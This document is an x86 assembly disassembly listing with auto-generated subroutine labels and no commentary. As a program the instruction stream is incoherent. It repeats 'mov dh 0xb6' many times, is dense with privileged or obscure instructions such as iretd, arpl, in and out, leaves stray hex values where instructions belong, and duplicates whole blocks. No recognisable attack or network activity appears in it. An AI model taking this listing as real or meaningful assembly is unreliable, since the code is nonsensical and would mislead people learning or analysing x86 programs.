mov dh 0xb6
mov dh 0xb6
mov dh 0x40
mov [ 0x2527cff4 ] eax
mov dh 0xce
lds ecx [ edi ]
movsd [ edi ] es : [ esi ]
loop r-xdata
fstpnce st1
mov dh 0xb6
mov dh 0xb6
inc eax
movsd [ edi ] [ esi ]
pop ds
push es
iretd
mov [ 0xffffffffe2a229e6 ] eax
fcomp st1
fldcw [ ebp - 0x4730f198 ]
xor ah [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
adc eax 0x3274cffd
dec esp
cmp [ ecx + ebx * 8 - 0x31 ] ecx
inc ebp
das
mov dh 0xb6
mov dh 0xb6
into
0xd9cf
sub_47406c
xor al bl
fstpnce st1
mov dh 0xb6
mov dh 0xb6
jne r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
inc esi
add al 0x26
iretd
into
mov [ edi ] al
movsd [ edi ] es : [ esi ]
loop r-xdata
mov [ es : 0xffffffffd598cfe6 ] eax
fstpnce st1
mov dh 0xb6
lodsd [ esi ]
imul ebp [ edx ] 0xffffffaf
daa
iretd
dec esp
iretd
sub_474081
cmp eax 0xb6d9d9c6
sub [ esi + esi * 4 + 0x4cd9d9f0 ] esp
fnstenv [ es : eax + 0x2626268a ]
jns r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
popad
pop ds
pop ebp
push cs
sub [ ebx - 0x26262f45 ] esp
iretd
iretd
sub_4740b9
bound esp [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
lodsd [ esi ]
mov al [ 0x262626d6 ]
jne r-xdata
jle r-xdata
scasd [ edi ]
arpl bx cx
iretd
fstpnce st1
iretd
push eax
iretd
sub_474150
in al dx
iretd
stosd [ edi ]
mov [ 0xffffffffd9d9dbee ] eax
jbe r-xdata
push ebx
ficom [ 0xffffffffd9dea5ef ]
sub [ ebx - 0x26285219 ] esi
cmc
iretd
jo r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jns r-xdata
fisub [ edi + 0x2622b2ca ]
iretd
jge r-xdata
sub eax 0xd9b62626
jo r-xdata
out 0x29 al
mov [ 0xffffffffd9d9d324 ] al
stosd [ edi ]
imul esi edx 0xffffffab
arpl [ edx - 0x26009732 ] ax
fldenv [ ebx - 0x365dd61a ]
rcr cl cl
fldcw [ ebx + 0x63abe26b ]
or dh 0x1d
sub_47422e
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
sbb ah [ 0x262259a5 ]
sub [ eax - 0x2626298d ] esp
movsd [ edi ] [ esi ]
inc edx
add al [ edx ]
stosd [ edi ]
bound eax [ edx ]
add cl bh
pop ss
pop es
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
iretd
sub_47425d
sbb esp [ esi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
into
fcmove st7
fstpnce st1
jg r-xdata
iretd
mov [ 0x2aa329e6 ] eax
fcomp st1
fstpnce st1
bound eax [ edx ]
iretd
sub_474294
pop edx
cmp esp [ esi ]
mov dh 0xb6
mov dh 0x40
scasd [ edi ]
arpl sp ax
jle r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
iretd
outsd
inc eax
scasd [ edi ]
arpl dx ax
jle r-xdata
mov dh 0xb6
mov dh 0xcf
adc ecx [ 0xffffffffb6b62626 ]
inc edx
inc eax
scasd [ edi ]
arpl ax ax
jle r-xdata
mov dh 0xb6
mov dh 0x75
mov dh 0xb6
inc ebx
inc eax
scasd [ edi ]
arpl si cx
jle r-xdata
iretd
dec eax
iretd
sub_474312
push esi
dec esp
mov dh 0xce
sar [ ecx ] cl
stosd [ edi ]
stosd [ edi ]
salc
fstp st1
fxch st6
popad
into
fstpnce st1
stosd [ edi ]
stosd [ edi ]
scasd [ edi ]
jae r-xdata
dec edx
add ch [ edx + 0x26becaa7 ]
jne r-xdata
iretd
jg r-xdata
jno r-xdata
adc eax 0x3c04cfd9
out 0x29 al
mov [ 0xffffffffd9d9cb2c ] eax
iretd
adc al [ eax - 0x51 ]
push esi
jns r-xdata
mov dh 0xa3
out 0x29 al
mov [ 0xffffffffd9d9cb39 ] eax
stosd [ edi ]
arpl si si
jbe r-xdata
inc eax
scasd [ edi ]
pop ebx
int3
jae r-xdata
push esp
lodsd [ esi ]
loope r-xdata
mov dh 0xa3
out 0x29 al
mov [ 0xffffffffd9d9f095 ] al
iretd
fxch st7
add al 0x3c
arpl [ esi ] bp
into
add [ ecx ] ah
dec edx
jl r-xdata
mov dh 0xb6
mov dh 0xb6
out 0xde eax
cmp [ esi + 0x3656cf27 ] ecx
dec esp
out 0xd7 eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
sub [ edx + 0x26263c17 ] esp
sub_474320
fstpnce st1
mov dh 0xb6
stosd [ edi ]
jg r-xdata
jno r-xdata
adc eax 0x3c04cfd9
out 0x29 al
mov [ 0xffffffffd9d9cb2c ] eax
iretd
adc al [ eax - 0x51 ]
push esi
jns r-xdata
mov dh 0xa3
out 0x29 al
mov [ 0xffffffffd9d9cb39 ] eax
stosd [ edi ]
arpl si si
jbe r-xdata
inc eax
scasd [ edi ]
pop ebx
int3
jae r-xdata
push esp
lodsd [ esi ]
loope r-xdata
mov dh 0xa3
out 0x29 al
mov [ 0xffffffffd9d9f095 ] al
iretd
fxch st7
add al 0x3c
arpl [ esi ] bp
into
add [ ecx ] ah
mov dh 0xb6
mov dh 0xb6
out 0xde eax
cmp [ esi + 0x3656cf27 ] ecx
dec esp
dec edx
jl r-xdata
out 0xd7 eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
sub [ edx + 0x26263c17 ] esp
mov dh 0xce
sar [ ecx ] cl
stosd [ edi ]
stosd [ edi ]
salc
fstp st1
fxch st6
popad
into
fstpnce st1
stosd [ edi ]
stosd [ edi ]
scasd [ edi ]
jae r-xdata
dec edx
add ch [ edx + 0x26becaa7 ]
jne r-xdata
iretd
sub_474470
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x7f
inc edx
lodsd [ esi ]
daa
cmpsb [ esi ] [ edi ]
pop esi
and al 0x26
sub [ ebx + 0x26262621 ] esp
loope r-xdata
mov dh 0x73
lodsd [ esi ]
0xcaa5
fisub [ esi ]
iretd
sub_474499
mov al [ eax ]
mov dh 0xad
imul ebx edx 0xffffffcf
aaa
add [ esi ] ah
stosd [ edi ]
mov [ 0x2626b602 ] al
jbe r-xdata
iretd
and ah [ edi ]
fnstenv [ es : eax + 0x2626269e ]
mov [ 0x51a229e6 ] eax
vpsubusw xmm5 xmm4 [ ebp - 0x5ac9fd8e ]
in al 0x22
stosd [ edi ]
mov [ 0x2626b602 ] al
into
add dh [ edi ]
iretd
sub_4744d5
mov [ 0xffffffffb6262622 ] al
sub [ ebx + 0x26260135 ] esp
or eax 0x6e220262
in eax 0xb6
mov dh 0x29
mov [ 0x262601a3 ] eax
adc eax 0xb6b6e5e6
mov dh 0xb6
mov dh 0xb6
jae r-xdata
stosd [ edi ]
mov [ 0x2626b602 ] al
jbe r-xdata
0xcaa5
iretd
and ah [ edi ]
fnstenv [ es : eax + 0x2626269e ]
mov [ 0x51a229e6 ] eax
vpsubusw xmm5 xmm4 [ ebp - 0x5ac9fd8e ]
in al 0x22
stosd [ edi ]
mov [ 0x2626b602 ] al
into
add dh [ edi ]
iretd
sub_4744fc
cmp cl bh
out 0xf7 al
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0x71
dec esp
push ebp
jg r-xdata
cdq
push 0x40262652
inc edi
lodsd [ esi ]
out 0x40 eax
scasd [ edi ]
arpl si di
jle r-xdata
sbb eax 0x20a329e9
movsd [ edi ] es : [ esi ]
dec ebx
lodsd [ esi ]
test [ eax - 0x51 ] 0x73
cld
jl r-xdata
in al 0x24
movsd [ edi ] [ esi ]
into
and al 0xa3
out 0x29 al
mov [ 0xffffffffd9d9c568 ] al
push esi
inc eax
scasd [ edi ]
jae r-xdata
dec esp
jl r-xdata
iretd
sub [ edx - 0x26263a98 ] esp
dec edx
inc eax
scasd [ edi ]
jae r-xdata
cli
jl r-xdata
or ch al
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x73
lodsd [ esi ]
0x82cf
inc ebx
inc eax
scasd [ edi ]
jae r-xdata
jae r-xdata
jl r-xdata
stosd [ edi ]
mov [ 0x2626b602 ] al
jbe r-xdata
0xcaa5
push 0xcfd9d9c5
scasd [ edi ]
jae r-xdata
iretd
and ah [ edi ]
fnstenv [ es : eax + 0x2626269e ]
mov [ 0x51a229e6 ] eax
vpsubusw xmm5 xmm4 [ ebp - 0x5ac9fd8e ]
in al 0x22
stosd [ edi ]
mov [ 0x2626b602 ] al
into
add dh [ edi ]
iretd
movsd [ edi ] [ esi ]
0xcf3a
iretd
sub_474537
aam 0xd9
fnstenv [ esi - 0x4949494a ]
mov dh 0xa5
fisub [ ecx + ebp ]
mov al [ 0x26262603 ]
sub [ ecx + 0x517c992c ] edx
inc eax
sbb eax 0x28a229e9
cdq
push 0x40262652
sbb eax 0x20a329e9
movsd [ edi ] es : [ esi ]
in al 0x24
movsd [ edi ] [ esi ]
into
and al 0xa3
out 0x29 al
mov [ 0xffffffffd9d9c568 ] al
iretd
sub_4745ec
sbb al 0x24
mov dh 0xad
arpl dx bx
lodsb [ esi ]
imul ebp [ edx ] 0xffffffcf
sub [ edx ] al
mov dh 0x40
scasd [ edi ]
arpl dx dx
jle r-xdata
adc eax 0x67cf71d9
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x15
out 0x66 al
iretd
scasd [ edi ]
arpl ax dx
adc eax 0xfcc3cfe6
fstpnce st1
lodsd [ esi ]
cmpsb [ esi ] [ edi ]
and [ esi ] 0x26
iretd
sub_474626
sub cl [ esi + ebp - 0x31 ]
mov dh 0x22
mov dh 0x77
dec esp
adc ax 0x76e6
dec esp
and al 0xcf
popad
int1
fstpnce st1
mov dh 0x73
lodsd [ esi ]
0x7577
sub_474661
fst [ 0x3b52cfe6 ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jno r-xdata
fstpnce st1
mov dh 0x40
scasd [ edi ]
imul esi edx 0x7f
dec esp
pop esi
inc eax
scasd [ edi ]
imul esi eax 0x7f
iretd
fst [ edx + 0x2 ]
into
mov [ 0xffffffffe2a52626 ] edi
sub cl [ esi + 0x26 ]
cmpsb [ esi ] [ edi ]
jne r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x15
out 0x66 al
iretd
sub [ esi ] dh
mov dh 0xb6
lodsd [ esi ]
test [ eax - 0x51 ] 0x73
retn 0xdfcf
sub_4746aa
fstpnce st1
dec esp
push eax
inc eax
scasd [ edi ]
arpl ax cx
jle r-xdata
hlt
inc ebx
jge r-xdata
aas
mov dh 0xb6
mov dh 0xb6
inc eax
mov [ 0x3268cff4 ] eax
mov dh 0xb6
mov dh 0xad
xor cl [ gs : edx - 0x51 ]
bound eax [ edx ]
push cs
dec esi
push ss
iretd
scasd [ edi ]
arpl si dx
dec esp
push esp
iretd
sub_4746cf
lea eax [ esi ]
mov dh 0xb6
dec esi
sbb ch [ eax - 0x259c5082 ]
into
test [ 0xffffffffcf762626 ] eax
fstp st1
fnstenv [ esi - 0xd9450c0 ]
jg r-xdata
cmp cl [ esi + 0x26 ]
cmpsb [ esi ] [ edi ]
pop esi
inc eax
scasd [ edi ]
imul esi eax 0x7f
iretd
scasd [ edi ]
pushad
sbb cl dh
rol ah 0x1
fstpnce st1
dec esi
xchg edi eax
and dl cl
jno r-xdata
push ebx
rcr cl cl
jno r-xdata
mov dh 0xb6
mov dh 0xb6
inc eax
mov [ 0x3268cff4 ] eax
mov dh 0xb6
mov dh 0xad
xor cl [ gs : edx - 0x51 ]
bound eax [ edx ]
push cs
dec esi
push ss
iretd
jne r-xdata
mov bl 0x31
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fnstenv [ ecx + 0x3a ]
dec esi
cmpsb [ es : esi ] [ edi ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
jbe r-xdata
iretd
iretd
mov [ 0xfffffffff78bcfe6 ] eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
mov [ 0xffffffffd9d9dbf6 ] eax
jbe r-xdata
mov dh 0xd9
mov dh 0x86
adc eax 0xcbe0cfef
fstpnce st1
stosd [ edi ]
mov [ 0xffffffffd9d9dbde ] eax
iretd
scasd [ edi ]
xchg ebx eax
neg bl
fstpnce st1
fnstenv [ ecx + 0x36 ]
iretd
sub_4746f6
or edi [ edi ]
mov dh 0xb6
mov dh 0xb6
inc eax
mov [ 0x3268cff4 ] eax
mov dh 0xb6
mov dh 0xad
xor cl [ gs : edx - 0x51 ]
bound eax [ edx ]
push cs
dec esi
push ss
iretd
sub_474718
scasd [ edi ]
add [ esi ] ah
scasd [ edi ]
mov dh 0xb6
mov dh 0xb6
inc eax
mov [ 0x3268cff4 ] eax
mov dh 0xb6
mov dh 0xad
xor cl [ gs : edx - 0x51 ]
bound eax [ edx ]
push cs
dec esi
push ss
iretd
mov bl 0x31
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
fnstenv [ ecx + 0x3a ]
dec esi
cmpsb [ es : esi ] [ edi ]
jne r-xdata
pushad
sbb cl dh
rol ah 0x1
fstpnce st1
dec esi
xchg edi eax
and dl cl
jno r-xdata
scasd [ edi ]
push ebx
rcr cl cl
jno r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
jbe r-xdata
iretd
iretd
mov [ 0xfffffffff78bcfe6 ] eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
mov [ 0xffffffffd9d9dbf6 ] eax
jbe r-xdata
mov dh 0xd9
mov dh 0x86
adc eax 0xcbe0cfef
fstpnce st1
stosd [ edi ]
mov [ 0xffffffffd9d9dbde ] eax
iretd
scasd [ edi ]
xchg ebx eax
neg bl
fstpnce st1
fnstenv [ ecx + 0x36 ]
iretd
sub_47477e
imul ecx edi 0xffffffd9
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
adc eax 0xb6b6e5e6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
jbe r-xdata
iretd
mov [ 0xfffffffff78bcfe6 ] eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xab
mov [ 0xffffffffd9d9dbf6 ] eax
jbe r-xdata
mov dh 0xd9
mov dh 0x86
adc eax 0xcbe0cfef
fstpnce st1
stosd [ edi ]
mov [ 0xffffffffd9d9dbde ] eax
iretd
scasd [ edi ]
xchg ebx eax
neg bl
fstpnce st1
fnstenv [ ecx + 0x36 ]
iretd
sub_4748b1
scasd [ edi ]
jpo r-xdata
mov dh 0xb6
mov dh 0xcf
les ebp [ ebx ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
fild [ ebp + 0x5baf40f7 ]
aam 0x40
scasd [ edi ]
jae r-xdata
inc eax
scasd [ edi ]
pop ebx
ror bh 0x1
sub eax 0xb626263b
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xcf
inc eax
leave
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0x29
mov [ 0x26262625 ] al
adc eax 0x22cf66e6
iretd
inc eax
scasd [ edi ]
jpo r-xdata
lodsd [ esi ]
fisubr [ ebp + 0x7baf40f6 ]
les eax [ eax - 0x51 ]
pop ebx
rcl [ 0x73af40d9 ] cl
lodsw [ esi ]
fst [ 0xffffffffb6b6e5e6 ]
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
iretd
inc eax
scasd [ edi ]
jae r-xdata
arpl dx sp
scasb [ edi ]
arpl dx si
iretd
lodsd [ esi ]
sub_474bb1
pop esp
into
fstpnce st1
out dx eax
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
arpl si ax
jle r-xdata
and ah [ esi ]
sar esi 0x1
out dx eax
in eax 0xb6
inc esp
inc eax
scasd [ edi ]
arpl sp ax
jle r-xdata
sbb eax 0x4ba229e5
mov [ 0xffffffffd9d9dbee ] eax
jbe r-xdata
pop ebx
daa
sub [ ebx - 0x26260cfc ] esp
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
cmpsb [ esi ] [ edi ]
inc edi
inc eax
scasd [ edi ]
arpl dx ax
jle r-xdata
iretd
mov [ 0xffffffffd9d9de92 ] eax
jbe r-xdata
iretd
sub esp [ esi ]
iretd
mov edx 0xb626262d
fnstenv [ ecx + 0x2626268e ]
sbb eax 0x4ba229e5
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xa6
jo r-xdata
mov dh 0xb6
mov dh 0x7e
dec esp
push esp
inc eax
scasd [ edi ]
arpl sp cx
jle r-xdata
iretd
jne r-xdata
mov [ 0xffffffffd9d9f304 ] eax
pop ebx
int3
sub_474c46
cld
neg ecx
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
mov dh 0xb6
mov [ 0xffffffffd9d9f304 ] eax
pop ebx
int3
sbb eax 0x4ba229e5
sub esp [ esi ]
iretd
mov [ 0xffffffffd9d9dbee ] eax
jbe r-xdata
iretd
mov [ 0xffffffffd9d9de92 ] eax
jbe r-xdata
jne r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xa6
pop ebx
daa
sub [ ebx - 0x26260cfc ] esp
jo r-xdata
mov dh 0xb6
mov dh 0x7e
dec esp
push esp
inc eax
scasd [ edi ]
arpl sp cx
jle r-xdata
iretd
sub_474e4f
stc
aam 0xd9
fnstenv [ esi + 0x4ce615b6 ]
pop esi
inc eax
scasd [ edi ]
arpl ax ax
inc eax
scasd [ edi ]
imul eax esi 0x7f
stosd [ edi ]
arpl si cx
iretd
sub_474e85
les esi [ ebx ]
mov dh 0xb6
inc eax
scasd [ edi ]
arpl si di
lodsd [ esi ]
out 0x40 eax
scasd [ edi ]
arpl sp di
lodsd [ esi ]
loopne r-xdata
iretd
scasd [ edi ]
arpl dx di
iretd
sub_474ee7
xor dh dh
fstpnce st1
mov dh 0xb6
jg r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
arpl dx si
jle r-xdata
iretd
push esi
push esp
dec edx
push es
loope r-xdata
pop ds
iretd
0x43565f4e 0x63e1
sub_474f36
pop eax
fstpnce st1
fabs
arpl [ edx + 0x437e6b6b ] bx
loope r-xdata
mov dh 0xce
xor ebp 0xe6a3d9d9
sub [ ebx - 0x262610be ] esp
out 0x48 al
jo r-xdata
iretd
fstpnce st1
imul esp ecx 0x63
out dx al
push esi
push esp
dec edx
push es
loope r-xdata
0x43565f4e 0x63e1
sub_474f7e
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jno r-xdata
not [ eax + edx * 2 + 0x6 ]
push es
into
mov ch ch
fstpnce st1
jns r-xdata
ja r-xdata
movsd [ edi ] es : [ esi ]
jge r-xdata
loop r-xdata
dec esi
inc esi
mov eax [ 0xffffffffaf711081 ]
mov al [ 0x26262696 ]
into
cld
fstpnce st1
scasd [ edi ]
mov al [ 0x26262692 ]
movsd [ edi ] [ esi ]
iretd
dec esi
stosd [ edi ]
arpl dx cx
jbe r-xdata
iretd
sbb ecx ebx
fstpnce st1
mov dh 0x78
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
arpl dx si
jle r-xdata
cld
fstpnce st1
mov dh 0x4e
fsubp st2
sbb [ edi + 0x71 ] ebp
scasd [ edi ]
pushad
mov eax 0x262626ea
into
arpl dx cx
push ebp
dec esi
inc ebx
dec edx
loope r-xdata
push esi
push esp
dec edx
push es
loope r-xdata
pop ds
and cl dh
je r-xdata
fstpnce st1
stosd [ edi ]
salc
dec edx
adc eax 0xf5d92614
lodsd [ esi ]
iretd
0x43565f4e 0x63e1
iretd
lodsd [ esi ]
loopne r-xdata
arpl dx dx
jbe r-xdata
call 0xffffffffa6212a5d
loop r-xdata
out 0xc3 al
pop esp
xchg esi eax
jne r-xdata
dec esi
mov esp 0x4ed9d9db
add al 0x24
cdq
lodsb [ esi ]
jno r-xdata
mov dh 0x7f
dec esp
pop edi
iretd
movsd [ edi ] [ esi ]
pop edx
add dh [ edx ]
daa
sub [ ebx - 0x26261f93 ] esp
iretd
das
cld
fstpnce st1
dec esi
int3
into
insd
neg cl
fnstenv [ esi - 0x4949494a ]
stosd [ edi ]
popad
daa
jbe r-xdata
jmp r-xdata
nop
and [ esi - 0x59 ] esi
loope r-xdata
mov [ 0x2626be02 ] al
jno r-xdata
stosd [ edi ]
sub_474ff8
mov [ 0xda229fd ] eax
dec esi
cld
fstpnce st1
mov dh 0x4e
fsubp st2
sbb [ edi + 0x71 ] ebp
scasd [ edi ]
pushad
mov eax 0x262626ea
into
and cl dh
je r-xdata
fstpnce st1
out 0xc3 al
pop esp
xchg esi eax
jne r-xdata
dec esi
stosd [ edi ]
arpl dx cx
jbe r-xdata
dec esi
inc esi
mov eax [ 0xffffffffaf711081 ]
mov al [ 0x26262696 ]
into
cld
fstpnce st1
scasd [ edi ]
mov al [ 0x26262692 ]
movsd [ edi ] [ esi ]
loop r-xdata
arpl dx cx
push ebp
dec esi
inc ebx
dec edx
loope r-xdata
stosd [ edi ]
salc
dec edx
adc eax 0xf5d92614
lodsd [ esi ]
iretd
lodsd [ esi ]
loopne r-xdata
arpl dx dx
jbe r-xdata
call 0xffffffffa6212a5d
loop r-xdata
dec esi
mov esp 0x4ed9d9db
add al 0x24
cdq
lodsb [ esi ]
jno r-xdata
mov dh 0x7f
dec esp
pop edi
iretd
movsd [ edi ] [ esi ]
pop edx
add dh [ edx ]
daa
sub [ ebx - 0x26261f93 ] esp
iretd
das
cld
fstpnce st1
dec esi
int3
into
insd
neg cl
fnstenv [ esi - 0x4949494a ]
stosd [ edi ]
popad
daa
jbe r-xdata
jmp r-xdata
nop
and [ esi - 0x59 ] esi
loope r-xdata
mov [ 0x2626be02 ] al
jno r-xdata
stosd [ edi ]
sub_475071
add al 0xeb
fstpnce st1
mov dh 0xcf
or esi [ 0x4eb62626 ]
dec esp
scasw [ edi ]
arpl dx dx
stosd [ edi ]
arpl dx dx
jbe r-xdata
lodsb [ esi ]
jno r-xdata
arpl [ esi ] bp
dec esp
iretd
into
insd
neg cl
fnstenv [ esi - 0x4949494a ]
stosd [ edi ]
popad
daa
jbe r-xdata
jmp r-xdata
nop
and [ esi - 0x59 ] esi
loope r-xdata
stosd [ edi ]
iretd
lodsd [ esi ]
loopne r-xdata
arpl dx dx
jbe r-xdata
call 0xffffffffa6212a5d
loop r-xdata
dec esi
mov esp 0x4ed9d9db
add al 0x24
cdq
mov dh 0x7f
dec esp
pop edi
iretd
movsd [ edi ] [ esi ]
pop edx
add dh [ edx ]
daa
sub [ ebx - 0x26261f93 ] esp
iretd
cld
fstpnce st1
mov dh 0x4e
fsubp st2
sbb [ edi + 0x71 ] ebp
scasd [ edi ]
pushad
das
cld
fstpnce st1
dec esi
int3
mov eax 0x262626ea
into
and cl dh
je r-xdata
fstpnce st1
out 0xc3 al
pop esp
xchg esi eax
jne r-xdata
dec esi
stosd [ edi ]
arpl dx cx
jbe r-xdata
dec esi
inc esi
mov eax [ 0xffffffffaf711081 ]
mov al [ 0x26262696 ]
into
cld
fstpnce st1
scasd [ edi ]
mov al [ 0x26262692 ]
movsd [ edi ] [ esi ]
loop r-xdata
arpl dx cx
push ebp
dec esi
inc ebx
dec edx
loope r-xdata
mov [ 0x2626be02 ] al
jno r-xdata
stosd [ edi ]
salc
dec edx
adc eax 0xf5d92614
lodsd [ esi ]
sub_475090
push 0xffffffda
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jg r-xdata
mov dh 0xd9
mov al 0x8a
stosd [ edi ]
arpl [ edx ] cx
jbe r-xdata
pop edi
iretd
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x15
ror bh 0x1
pushad
iretd
loopne r-xdata
stosd [ edi ]
arpl [ esi + 0x4c757576 ] cx
push es
jne r-xdata
in eax dx
fstp st1
fnstcw [ edi - 0x5d ]
out 0xcf al
nop
int 0xd9
fnstenv [ esi + 0x26a6b0d9 ]
scasd [ edi ]
bound eax [ edx ]
iretd
fstpnce st1
mov dh 0xce
xchg esp ebx
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
iretd
inc ecx
leave
fstpnce st1
mov dh 0xb6
mov dh 0x15
out dx eax
movsd [ edi ] [ esi ]
fcompp
sub [ ebx + 0x37a8cfe7 ] esi
mov dh 0xb6
mov dh 0xb6
sub [ ebx + 0x26262624 ] esp
sar esi 0x1
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
xchg ecx eax
loop r-xdata
scasd [ edi ]
bound eax [ edx ]
push es
iretd
xlat
fstpnce st1
into
cld
aad 0xd9
fldenv [ ebp + 0xdcf3ee2 ]
neg cl
fnstenv [ esi - 0x4949494a ]
mov dh 0x40
scasd [ edi ]
imul ecx [ edx + 0x15 ] 0xfffffffd
into
rcr dh 0x1
fstpnce st1
jg r-xdata
xlat
rcr cl 0x1
fxch st7
mov eax 0xab262631
mov [ 0xffffffffd9d9db5e ] eax
iretd
iretd
out 0x29 al
mov [ 0xffffffffd9d9d74a ] eax
sub_4750e7
dec esp
xor [ esi ] ah
mov dh 0xd9
mov al 0x8a
stosd [ edi ]
arpl [ edx ] cx
jbe r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x15
ror bh 0x1
pushad
iretd
loopne r-xdata
stosd [ edi ]
arpl [ esi + 0x4c757576 ] cx
push es
jne r-xdata
in eax dx
fstp st1
fnstcw [ edi - 0x5d ]
out 0xcf al
nop
int 0xd9
fnstenv [ esi + 0x26a6b0d9 ]
scasd [ edi ]
bound eax [ edx ]
iretd
fstpnce st1
mov dh 0xce
xchg esp ebx
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
iretd
inc ecx
leave
fstpnce st1
mov dh 0xb6
mov dh 0x15
out dx eax
movsd [ edi ] [ esi ]
fcompp
sub [ ebx + 0x37a8cfe7 ] esi
mov dh 0xb6
mov dh 0xb6
sub [ ebx + 0x26262624 ] esp
sar esi 0x1
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
xchg ecx eax
loop r-xdata
scasd [ edi ]
bound eax [ edx ]
push es
iretd
xlat
fstpnce st1
into
cld
aad 0xd9
fldenv [ ebp + 0xdcf3ee2 ]
neg cl
fnstenv [ esi - 0x4949494a ]
mov dh 0x40
scasd [ edi ]
imul ecx [ edx + 0x15 ] 0xfffffffd
into
rcr dh 0x1
fstpnce st1
jg r-xdata
xlat
rcr cl 0x1
fxch st7
mov eax 0xab262631
mov [ 0xffffffffd9d9db5e ] eax
iretd
iretd
out 0x29 al
mov [ 0xffffffffd9d9d74a ] eax
sub_475128
cmp al 0xe1
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
and eax 0x25ff25df
xlat
scasd [ edi ]
arpl si bx
mov [ 0xffffffffc638cfe6 ] eax
fstpnce st1
mov dh 0xce
xchg esp ebx
fstpnce st1
movsd [ edi ] [ esi ]
loop r-xdata
inc ecx
leave
fstpnce st1
mov dh 0xb6
mov dh 0x15
out dx eax
movsd [ edi ] [ esi ]
fcompp
sub [ ebx + 0x37a8cfe7 ] esi
mov dh 0xb6
mov dh 0xb6
sub [ ebx + 0x26262624 ] esp
sar esi 0x1
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xd9
xchg ecx eax
loop r-xdata
scasd [ edi ]
bound eax [ edx ]
push es
iretd
xlat
fstpnce st1
into
cld
aad 0xd9
fldenv [ ebp + 0xdcf3ee2 ]
neg cl
fnstenv [ esi - 0x4949494a ]
mov dh 0x40
scasd [ edi ]
imul ecx [ edx + 0x15 ] 0xfffffffd
into
rcr dh 0x1
